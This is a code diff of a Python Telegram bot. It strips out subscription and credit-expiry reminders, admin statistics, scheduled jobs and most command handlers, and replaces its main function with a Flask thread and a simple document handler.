-            send_notify = True
-            message = f"⏰ *Your subscription expires in {days_left} days!* Please renew via /buy to continue enjoying unlimited checks."
-        elif days_left == 0 and remaining.seconds <= 86400 and not user.get("notified_last_day"):
-            user["notified_last_day"] = True
-            send_notify = True
-            message = "⚠️ *Your subscription ends TODAY!* Renew immediately to keep using unlimited checks."
-        if send_notify:
-            try:
-                await context.bot.send_message(uid, message, parse_mode="Markdown")
-                data_manager._mark_dirty()
-            except Exception:
-                pass
-    data_manager.save()
-
-async def check_credit_expirations(context: ContextTypes.DEFAULT_TYPE):
-    now = datetime.now()
-    expiring = data_manager.get_expiring_credits(10)
-    for uid, amount, expiry in expiring:
-        days = (expiry - now).days
-        user = data_manager.get_user(uid)
-        last_notify = user.get("last_credit_notify", 0)
-        if now.timestamp() - last_notify > 86400:
-            try:
-                await context.bot.send_message(
-                    uid,
-                    f"⚠️ *Credit Expiry Warning*\n{amount} credit(s) will expire on {expiry.strftime('%Y-%m-%d')} (in {days} days).\nUse them before they expire!",
-                    parse_mode="Markdown"
-                )
-                user["last_credit_notify"] = now.timestamp()
-                data_manager._mark_dirty()
-            except Exception:
-                pass
-    data_manager.save()
-
-# ---------- Periodic Jobs ----------
-async def periodic_save_job(context: ContextTypes.DEFAULT_TYPE):
-    await data_manager.periodic_save()
-
-async def hourly_admin_update(context: ContextTypes.DEFAULT_TYPE):
-    if not data_manager.data.get("admins"):
-        return
-    users = data_manager.data["users"]
-    total = len(users)
-    active_codes = len(data_manager.get_active_codes())
-    subs = sum(1 for u in users.values() if u.get("subscription_end") and datetime.fromtimestamp(u["subscription_end"]) > datetime.now())
-    msg = f"⏰ *Hourly Stats*\nUsers: {total}\nCodes: {active_codes}\nSubscriptions: {subs}"
-    for aid in data_manager.data["admins"]:
-        try:
-            await context.bot.send_message(aid, msg, parse_mode="Markdown")
-        except Exception:
-            pass
-
-async def gc_job(context: ContextTypes.DEFAULT_TYPE):
-    gc.collect()
-    logger.info("Garbage collection executed")
-
-async def startup_notification(context: ContextTypes.DEFAULT_TYPE):
-    for admin_id in data_manager.data.get("admins", []):
-        try:
-            await context.bot.send_message(admin_id, "🤖 *Bot started!*\nHourly backup job is active.", parse_mode="Markdown")
-            logger.info(f"Startup notification sent to admin {admin_id}")
-        except Exception as e:
-            logger.error(f"Could not send startup message to {admin_id}: {e}")
-
-# ---------- Main ----------
 def main():
-    gc.collect()
-    app = Application.builder().token(BOT_TOKEN).build()
+    # Start Flask in a separate thread
+    flask_thread = Thread(target=run_flask, daemon=True)
+    flask_thread.start()
 
-    # User commands
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("balance", balance_command))
-    app.add_handler(CommandHandler("referral", referral_command))
-    app.add_handler(CommandHandler("buy", buy_command))
-    app.add_handler(CommandHandler("claimcode", claimcode_command))
+    # Set up Telegram bot
+    application = Application.builder().token(BOT_TOKEN).build()
 
-    # Admin commands
-    app.add_handler(CommandHandler("addadmin", addadmin))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-    app.add_handler(CommandHandler("gengiftcode", gen_gift_code))
-    app.add_handler(CommandHandler("codestats", codestats))
-    app.add_handler(CommandHandler("delcode", delcode))
-    app.add_handler(CommandHandler("addcredit", addcredit))
-    app.add_handler(CommandHandler("removecredit", removecredit))
-    app.add_handler(CommandHandler("backup", backup))
-    app.add_handler(CommandHandler("sendbackup", sendbackup))
-    app.add_handler(CommandHandler("restore", restore))
-    app.add_handler(CommandHandler("stats", stats))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
-    # Message handlers
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_restore_file))
-
-    # Callback handler
-    app.add_handler(CallbackQueryHandler(callback_handler))
-
-    # Job queue
-    job_queue = app.job_queue
-    if job_queue:
-        job_queue.run_repeating(periodic_save_job, interval=SAVE_INTERVAL_SECONDS, first=10)
-        job_queue.run_repeating(hourly_admin_update, interval=3600, first=60)
-        job_queue.run_repeating(hourly_backup_job, interval=3600, first=60)      # every hour
-        job_queue.run_repeating(check_subscription_expirations, interval=43200, first=60)  # twice daily
-        job_queue.run_repeating(check_credit_expirations, interval=86400, first=300)       # once daily
-        job_queue.run_repeating(gc_job, interval=3600, first=3600)
-        # Send startup notification after 5 seconds
-        job_queue.run_once(startup_notification, when=5)
-
-    logger.info("Bot started with automatic hourly backup (file: userdata_backup.json) to all admins.")
-    app.run_polling()
+    print("Bot started. Press Ctrl+C to stop.")
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
